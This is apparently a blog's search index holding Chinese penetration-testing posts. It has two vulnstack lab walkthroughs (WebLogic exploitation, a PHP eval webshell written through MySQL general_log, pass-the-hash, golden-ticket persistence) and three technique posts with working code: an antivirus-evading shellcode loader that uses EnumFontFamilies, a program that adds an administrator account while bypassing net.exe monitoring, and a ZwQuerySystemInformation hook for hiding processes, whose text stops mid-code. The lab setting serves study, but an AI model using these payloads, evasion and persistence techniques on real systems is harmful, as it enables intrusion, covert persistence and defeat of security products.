<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>域渗透之黄金票据权限维持</title>
    <link href="/2021/07/12/hongri2/"/>
    <url>/2021/07/12/hongri2/</url>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>DC：</p><ul><li>IP：10.10.10.10</li><li>OS：Windows 2012</li></ul><p>WEB：</p><ul><li>IP1：10.10.10.80</li><li>IP2：192.168.111.80</li><li>OS：Windows 2008</li><li>网站搭建:Weblogic 10.3.6 MSSQL 2008</li></ul><p>PC：</p><ul><li>IP1：10.10.10.201</li><li>IP2：192.168.111.201</li><li>OS：Windows 7</li></ul><p>攻击机：</p><ul><li>IP：192.168.111.129</li><li>OS：Windows 10</li><li>IP：192.168.111.128</li><li>OS：Kali</li></ul><p>内网网段：10.10.10.0/24<br>DMZ网段：192.168.111.0/24</p><p>进入<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录下管理员身份开启startWeblogic批处理程序<br><img src="/img/hongri2/2.png"></p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>使用nmap扫描端口<br><img src="/img/hongri2/3.png"></p><p>有445 SMB,3389 RDP登端口开启<br>1433端口和7001端口分别是是MSSQL和Weblogic服务<br><img src="/img/hongri2/4.png"></p><p>访问端口看看<br><img src="/img/hongri2/5.png"><br>这里有个报错,我们先不管,由于是WebLogic,默认目录<code>http://xxxxxx:7001/console</code>下为后台管理页面登录<br><img src="/img/hongri2/6.png"></p><p>尝试弱密码后无果,使用工具尝试WebLogic漏反序列化漏洞,即CVE-2019-2725<br><img src="/img/hongri2/7.png"></p><p>命令也能成功执行<br><img src="/img/hongri2/8.png"></p><p>这里就想上传一个稳定的webshell,用其他更强大的webshell工具去连<br><img src="/img/hongri2/9.png"></p><p>于是就想传一个webshell,用其他webshell工具去连<br>上传冰蝎jsp马到目录<code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code><br><img src="/img/hongri2/10.png"></p><p>连接成功<br><img src="/img/hongri2/11.png"></p><p>这里已经发现是一张双网卡主机,有可能10段通向内网<br><img src="/img/hongri2/12.png"></p><p>无ipc连接,net view命令无法使用<br><img src="/img/hongri2/13.png"></p><p>并已知是域内主机<br><img src="/img/hongri2/14.png"></p><p>查看进程无杀软,也无浏览器等信息(无法抓取浏览器密码),并且net命令返回ERROR 5 这是没有权限,于是准备反弹shell到后渗透神器cs,进行提权等操作</p><p><img src="/img/hongri2/15.png"></p><p><img src="/img/hongri2/16.png"></p><h2 id="后渗透-内网漫游"><a href="#后渗透-内网漫游" class="headerlink" title="后渗透(内网漫游)"></a>后渗透(内网漫游)</h2><h3 id="提权及信息获取"><a href="#提权及信息获取" class="headerlink" title="提权及信息获取"></a>提权及信息获取</h3><p>直接powershell上线<br><img src="/img/hongri2/17.png"></p><p>甜土豆进行提权<br><img src="/img/hongri2/18.png"></p><p>通过<code>nslookup</code>查询dns记录,这里查到一个<code>10.10.10.10</code>的ip,在域内,这个ip很有可能就是域控<br><img src="/img/hongri2/19.png"></p><p>又通过<code>net time</code>查到主域名称<br><img src="/img/hongri2/20.png"></p><p>抓取本机密码<br><img src="/img/hongri2/21.png"><br>可以看到其中有mssql明文密码和Administrator明文密码</p><p>准备3389连接,不过无论是<code>Administrator</code>还是<code>de1ay</code>都无法登录,准备添加一个账户,但添加后说没有权限,应该是普通用户组没有权限<br><img src="/img/hongri2/24.png"></p><p>使用命令添加到管理员组,连接成功<br><img src="/img/hongri2/25.png"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>扫描下同网段其他主机<br><img src="/img/hongri2/21.png"></p><p>扫描<code>192.168.111.0/24</code>以及他们的端口,发现一台名为<code>PC</code>主机,并且3389开启<br><img src="/img/hongri2/22.png"></p><p>再扫描10段<br><img src="/img/hongri2/23.png"><br>发现一台名为DC主机,看着名字就知道是域控,加上刚刚探测dns和主域名称,并且他的ip是<code>10.10.10.10</code>,基本可以判断这台就是域控</p><p>那么在域控明确的情况下优先处理<code>DC</code>,首先想到的就是pth,因为域内很多密码都是批量设置的,这必须要试一下<br>使用当前抓取的Administrator账户和密码来传递</p><p><img src="/img/hongri2/26.png"><br>这里应该是成功了,但是迟迟未上线</p><p><img src="/img/hongri2/27.png"><br>太概率是由于对方不出网,无法形成反向shell,不出网的话一般就用smb处理,翻回刚刚的扫描记录,对方445端口是开启的,可以使用smb拿不出网主机<br><img src="/img/hongri2/28.png"></p><p>新增一个SMB beacon<br><img src="/img/hongri2/29.png"></p><p>再次使用psexec pass the hash<br><img src="/img/hongri2/30.png"></p><p>成功拿下DC<br><img src="/img/hongri2/31.png"></p><p>抓取DC密码<br>hashdump<br><img src="/img/hongri2/32.png"><br>有了域内<code>KRBTGT</code>账户的hash就可以伪造黄金票据</p><p>logonpasswords<br><img src="/img/hongri2/33.png"></p><p>查询域管账户<br><img src="/img/hongri2/34.png"><br>DC就算是拿下了</p><p>用相同的方式拿下PC<br><img src="/img/hongri2/35.png"><br>PC是出网的可以直接用http beacon</p><p><img src="/img/hongri2/36.png"></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>做权限维持方式很多,粘滞键、启动项、影子用户等等。这次是拿到域控,这种情况下,黄金票据是一个很好的维权手段<br>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p><p>黄金票据的条件要求：</p><ol><li>域名称</li><li>域的SID值</li><li>域的KRBTGT账户NTLM密码哈希</li><li>伪造用户名</li></ol><p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p><p>这里我们已经拿到了<code>KRBTGT</code>账户的hash值<br><img src="/img/hongri2/37.png"></p><p>并且也拿到了域的SID值,去掉最后的-1001<br><img src="/img/hongri2/38.png"><br>就可以伪造一张黄金票据</p><p>选择最边缘的web<br><img src="/img/hongri2/39.png"></p><p>伪造黄金票据成功<br><img src="/img/hongri2/40.png"></p><p>这里为了测试用了PC,一开始是无法访问域控目录的<br><img src="/img/hongri2/41.png"></p><p>生成黄金票据后<br><img src="/img/hongri2/42.png"></p><p>即使域控这台主机权限掉了,我们也能使用其他边缘主机用这个黄金票据模拟获得最高权限,而且由于跳过AS验证,无需担心域管密码被修改<br><img src="/img/hongri2/43.png"></p><p>添加域管账户<br><img src="/img/hongri2/44.png"><br>在域控上查看域管账户,添加成功<br><img src="/img/hongri2/45.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内网靶场实战一</title>
    <link href="/2021/07/11/hongri1/"/>
    <url>/2021/07/11/hongri1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来不想写这些的,但是最近项目写起来确实稍有些枯燥,又不敢拿真实环境去打,奈何两个月过后要去比赛,所以这段时间会加强web打点和内网这块,这些方面我是小白,欢迎斧正。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶场地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p><img src="/img/hongri1/1.png"><br>网卡配置:</p><p><img src="/img/hongri1/2.png"></p><p>网络拓扑图:<br>kali和web服务器模拟外网环境,并且web服务器有双网卡,一张通向内网<br><img src="/img/hongri1/3.png"></p><p>win7作为与外界相连的web服务器</p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>直接访问目标<br><img src="/img/hongri1/4.png"></p><p>试试弱密码root root,连接成功<br><img src="/img/hongri1/5.png"></p><p>再回来探测下端口信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">namp</span> -sV <span class="hljs-number">192.168.235.129</span><br></code></pre></td></tr></table></figure><p><img src="/img/hongri1/6.png"></p><p>可以看到只有3306 mysql和80端口开放<br>再扫下目录<br>可以看到phpmyadmin和一个rar包,应该是源码泄露<br><img src="/img/hongri1/7.png"></p><p>phpmyadmin还是弱密码root root<br><img src="/img/hongri1/8.png"></p><p>压缩包解压后是yxcms<br><img src="/img/hongri1/9.png"></p><p>在网上搜锁该cms的漏洞,发现后台<br><img src="/img/hongri1/10.png"></p><p>还是弱口令 admin 123456登录后台<br>后台有个位置任意文件写入<br><img src="/img/hongri1/11.png"></p><p>但是没看到路径,尝试bp报错找到路径<br><img src="/img/hongri1/12.png"></p><p>访问测试一下,后来发现跟改的url有关,成功访问<br><img src="/img/hongri1/13.png"></p><p>这样一个shell就拿到了<br><img src="/img/hongri1/14.png"></p><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p>回到刚刚phpmyadmin界面<br>利用全局变量general_log去getshell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">SHOW <span class="hljs-keyword">VARIABLES</span> LIKE <span class="hljs-comment">&#x27;%general%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/hongri1/15.png"><br>看到是off,是关闭的,于是尝试更改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log</span>=on<br></code></pre></td></tr></table></figure><p>再次查询就已经开启<br><img src="/img/hongri1/16.png"><br>再把网站日志文件名和后缀名改一下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:/phpstudy/www/yxcms/log.php&#x27;</span><br></code></pre></td></tr></table></figure><p>使用<code>SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</code>写入shell<br><img src="/img/hongri1/17.png"><br>连接成功<br><img src="/img/hongri1/18.png"></p><h2 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h2><p>因为平时cs用的比较多,所以这次就用msf试试<br>发现双网卡<br><img src="/img/hongri1/19.png"><br><code>192.168.26.0/24</code>通向内网<br>net view无回显,tasklist发现无杀软<br><img src="/img/hongri1/20.png"></p><p>权限还可以,3389未开放<br><img src="/img/hongri1/21.png"><br>因为权限够,也不需要提权了,直接修改注册表</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><p>再次查看发现已经开启<br><img src="/img/hongri1/22.png"></p><h3 id="反弹shell到msf"><a href="#反弹shell到msf" class="headerlink" title="反弹shell到msf"></a>反弹shell到msf</h3><p>生成一个powershell的马<br><img src="/img/hongri1/23.png"><br>监听<br><img src="/img/hongri1/24.png"><br>但是执行好像没成功,msf也没收到会话<br><img src="/img/hongri1/25.png"><br>应该是禁用了执行powershell,懒得改了,算了换个exe吧<br><img src="/img/hongri1/26.png"><br>上传执行后成功反弹shell<br><img src="/img/hongri1/27.png"><br>添加路由<br><img src="/img/hongri1/28.png"><br>探测内网存活主机,发现两台<br><img src="/img/hongri1/29.png"><br>直接扫一波永恒之蓝<br><img src="/img/hongri1/30.png"><br>发现129这台为2008且有永恒之蓝<br>使用command模块打一波,命令执行成功<br><img src="/img/hongri1/31.png"><br>想要反弹shell却失败了<br><img src="/img/hongri1/32.png"><br>复制个shell给cs,没上线,很无语<br><img src="/img/hongri1/33.png"><br>还是直接上吧,舒服多了<br><img src="/img/hongri1/34.png"><br>抓一波密码<br><img src="/img/hongri1/35.png"><br>抓到明文,这里其实就可以3389连上去看看<br><img src="/img/hongri1/36.png"><br>不过还是先扫,探测一下存活主机<br><img src="/img/hongri1/37.png"><br>这里第一时间是想横向一波,psexec,但是执行后服务已经建立,但是无shell反弹,突然想起这是台不出网主机,选择smb beacon即可<br><img src="/img/hongri1/38.png"></p><p><img src="/img/hongri1/39.png"></p><p>03拿下<br><img src="/img/hongri1/40.png"></p><p>同样的方法拿下域控2008<br><img src="/img/hongri1/41.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>滕蛇</title>
    <link href="/2021/07/03/TengSnake/"/>
    <url>/2021/07/03/TengSnake/</url>
    
    <content type="html"><![CDATA[<p>前几天师傅叫我写个连webshell的工具,本来觉得对我来说是个挑战,但后来细想这是有必要的,陆陆续续写了一些小的东工具西,也要带着一个大项目走。<br>将继续采用c++,MFC编写。</p><h2 id="滕蛇"><a href="#滕蛇" class="headerlink" title="滕蛇"></a>滕蛇</h2><p>这是我为它取得名字,”滕蛇”为上古十大神兽之一,希望它愈加强大的愿景。本文写在这里,纪念滕蛇的出生。</p><p><img src="/img/TengSnake/1.png"></p><p><img src="/img/TengSnake/2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode加载Tips之回调函数</title>
    <link href="/2021/06/27/CallBackByPass/"/>
    <url>/2021/06/27/CallBackByPass/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>VirtualAlloc</code>,<code>HeapAlloc</code>,<code>malloc</code>,<code>VirtualAllocEx</code>,这些API,只要你做过shellcode免杀就一定不会陌生,包括<code>CreatThread</code>或者函数指针这些执行,早就被终端产品标记烂了。利用回调函数,可以避免使用上述所有API。</p><h2 id="EnumFontFamilies"><a href="#EnumFontFamilies" class="headerlink" title="EnumFontFamilies"></a>EnumFontFamilies</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EnumFontFamiliesW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HDC           hdc,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR       lpLogfont,</span></span><br><span class="hljs-params"><span class="hljs-function">  FONTENUMPROCW lpProc,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPARAM        lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>MSDN:<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesw">https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesw</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br>DWORD oldProtect = <span class="hljs-number">0</span>;<br>BOOL ret = <span class="hljs-built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="hljs-keyword">sizeof</span> shellcode, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><br><span class="hljs-built_in">EnumFontFamilies</span>(<span class="hljs-built_in">GetDC</span>(<span class="hljs-number">0</span>), (LPCWSTR)<span class="hljs-number">0</span>, (FONTENUMPROC)(<span class="hljs-keyword">char</span>*)shellcode, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CallBackByPass/1.png"></p><h2 id="其他回调API"><a href="#其他回调API" class="headerlink" title="其他回调API"></a>其他回调API</h2><p>枚举资源:<code>EnumResourceTypes</code></p><p><img src="/img/CallBackByPass/2.png"></p><p>调用窗口:<code>CallWindowProc</code></p><p><img src="/img/CallBackByPass/3.png"></p><p>还有很多:<a href="https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Tips很短。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用windowsAPI规避net禁用</title>
    <link href="/2021/06/24/IcanUseNet/"/>
    <url>/2021/06/24/IcanUseNet/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做权限维持的时候,或者希望RDP到远程桌面,有时密码并没有那么容易抓到,那么通常寄希望于添加一个账户,那么往往我们会这样做:</p><p><img src="/img/IcanUseNet/1.png"></p><p>这没有任何问题,但如果有第三方杀软存在呢？这个命令未必能执行。</p><h2 id="NET"><a href="#NET" class="headerlink" title="NET"></a>NET</h2><p>NET命令是功能强大的以命令行方式执行的工具。它包含了管理网络环境、服务、用户、登陆等Windows 98/NT/2000 中大部分重要的管理功能。使用它可以轻松的管理本地或者远程计算机的网络环境，以及各种服务程序的运行和配置。或者进行用户管理和登陆管理等。</p><p>实际上net是调用了这个PE文件</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\n</span>et1.exe<br></code></pre></td></tr></table></figure><p><img src="/img/IcanUseNet/2.png"></p><p>那么终端产品同样也重点监控着这个文件的调用,甚至有经验的管理员也许会直接删除这个文件,这样我们希望添加用户的美好愿望就会泡汤。但经前人研究,利用<code>netapi32.dll</code>中的API,可以绕过这一限制(目前为止依然有效)。</p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="NetUserAdd"><a href="#NetUserAdd" class="headerlink" title="NetUserAdd"></a>NetUserAdd</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">NET_API_STATUS NET_API_FUNCTION <span class="hljs-title">NetUserAdd</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR servername,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   level,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPBYTE  buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD parm_err</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>NetUserAdd函数添加一个用户帐户，并指定密码和权限级别。<br>微软文档:<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd">https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd</a></p><h3 id="NetLocalGroupAddMembers"><a href="#NetLocalGroupAddMembers" class="headerlink" title="NetLocalGroupAddMembers"></a>NetLocalGroupAddMembers</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NET_API_STATUS NET_API_FUNCTION <span class="hljs-title">NetLocalGroupAddMembers</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR servername,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR groupname,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   level,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPBYTE  buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   totalentries</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>NetLocalGroupAddMembers能够把用户加到组里,比如Administrators组<br>微软文档:<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers">https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers</a></p><p>这两个函数的参数就不说了,参考微软文档</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;lm.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> hdrstop</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;netapi32.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">wchar_t</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    USER_INFO_1 ui;<br>    DWORD dwlevel = <span class="hljs-number">1</span>;<br>    DWORD dwError = <span class="hljs-number">0</span>;<br>    NET_API_STATUS nStatus;<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">fwprintf</span>(stderr, <span class="hljs-string">L&quot;[!] Usage: %s UserName PassWord\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    &#125;<br>    ui.usri1_name = argv[<span class="hljs-number">1</span>];<br>    ui.usri1_password = argv[<span class="hljs-number">2</span>];<br>    ui.usri1_priv = USER_PRIV_USER;<br>    ui.usri1_home_dir = <span class="hljs-literal">NULL</span>;<br>    ui.usri1_comment = <span class="hljs-literal">NULL</span>;<br>    ui.usri1_flags = UF_SCRIPT;<br>    ui.usri1_script_path = <span class="hljs-literal">NULL</span>;<br><br>    nStatus = <span class="hljs-built_in">NetUserAdd</span>(<span class="hljs-literal">NULL</span>, dwlevel, (LPBYTE)&amp;ui, &amp;dwError);<br><br>    <span class="hljs-keyword">if</span> (nStatus == NERR_Success)<br>    &#123;<br>        <span class="hljs-built_in">fwprintf</span>(stderr,<span class="hljs-string">L&quot;[+] User %s has been successfully added\n&quot;</span>,argv[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[!] A system error had ocurred %d\n&quot;</span>, nStatus);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>和直接添加用户一样,需要管理员权限。</p><p><img src="/img/IcanUseNet/3.png"></p><p>通过<code>NetLocalGroupAddMembers</code>将用户加入到Administrators组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++">LOCALGROUP_MEMBERS_INFO_3 account;<br>account.lgrmi3_domainandname = argv[<span class="hljs-number">1</span>];<br><br>NET_API_STATUS Status = <span class="hljs-built_in">NetLocalGroupAddMembers</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;Administrators&quot;</span>, <span class="hljs-number">3</span>, (LPBYTE)&amp;account, <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">if</span> (Status == NERR_Success || Status == ERROR_MEMBER_IN_ALIAS) <br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Administrators added Successfully!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Administrators added Failed!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/IcanUseNet/4.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HOOK之进程隐藏</title>
    <link href="/2021/06/23/HookZwQuerySystemInformation/"/>
    <url>/2021/06/23/HookZwQuerySystemInformation/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一次跟师傅交流时师傅谈到有些EDR或AV,他们保护目标主机,甚至无进程,不经想到病毒实际上也常用这种技术。当然,做到隐藏,一个简单的dll注入或者劫持就可以,但本文主要讲解关于进程的隐藏。</p><p>PE文件隐藏可以通过</p><ul><li>进程伪装: 将进程名替换成其他正常进程的名称(修改PEB路径和命令行信息)</li><li>傀儡进程: 通过将主进程挂起,替换内存数据,卸载镜像,修改上下文,并执行真正我们想要执行的进程,这也是一些壳的原理</li><li>HOOK: 通过HOOK三环最底层API<code>ZwQuerySystemInformation</code>实现隐藏,这是本文的重点</li><li>COM劫持、DLL劫持、DLL注入……</li></ul><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>在正向开发中,要想做到进程遍历,往往需要使用<code>EnumProcess</code>或是快照<code>CreateToolhelp32Snapshot</code>这些函数<br>而这些函数的底层(ring 3),都是调用的<code>ZwQuerySystemInformation</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NTSTATUS WINAPI <span class="hljs-title">ZwQuerySystemInformation</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">  _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">  _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>如果通过hook进行对<code>ZwQuerySystemInformation</code>的重定向,那么就可以改变执行流,返回的信息中已经被我们篡改。<br>32位下和64位下需要修改的字节数是不同的,使用xdbg断点找到对应的硬编码</p><p>32位下:<br>需要修改5个字节硬编码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xe9</span> xx xx xx xx<br></code></pre></td></tr></table></figure><p><img src="/img/HOOKZwQuerySystemInformation/1.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/2.png"></p><p>64位下:<br>需要修改12个字节的硬编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x48</span> <span class="hljs-number">0</span>xb<span class="hljs-number">8</span>, xx xx xx xx xx xx xx xx<br><span class="hljs-attribute">0xFF</span> <span class="hljs-number">0</span>xE<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="/img/HOOKZwQuerySystemInformation/3.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/4.png"><br>64位下该函数的名称已经改为<code>RtlGetNativeSystemInformation</code>。<br>将<code>hookZwQuerySystemInformation</code>函数写在dll中,这样方便注入到任何进程中。</p><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>hook函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 